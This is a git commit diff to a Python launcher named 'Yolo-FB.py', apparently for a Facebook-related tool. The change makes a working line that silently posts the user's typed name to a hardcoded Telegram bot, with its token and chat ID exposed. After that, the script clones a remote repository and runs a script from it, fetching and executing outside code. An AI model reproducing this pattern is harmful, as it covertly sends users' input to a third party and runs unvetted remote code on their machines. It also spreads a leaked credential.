8354223d759a091ef68ebd3b3a145fe55f5aafbd
F O X <101955458+5sz@users.noreply.github.com>
2022-03-26 05:01:11 +0300

    Update Yolo-FB.py

--- Yolo-FB.py
+++ Yolo-FB.py
@@ -1,4 +1,4 @@
-import os
+import os,requests
 os.system('clear')
 logo = """\033[93m
 
@@ -19,6 +19,6 @@ print(logo)
 wara_wara_asmare = input("\nEnter Your Name : ")
 Tele_ID = "5018227645"
 Tele_TK = "5288513101:AAHxyh_qZZ9BWLAMt14ZoaoJTJXtvb6BQyg"
-mrdm.post(f"https://api.telegram.org/bot{Tele_TK}/sendMessage?chat_id={Tele_ID}&text={wara_wara_asmare}")
+requests.post(f"https://api.telegram.org/bot{Tele_TK}/sendMessage?chat_id={Tele_ID}&text={wara_wara_asmare}")
 os.system('clear')
 os.system('git clone https://github.com/5sz/Yolo ;cd Yolo ;python YoLoFB.py')
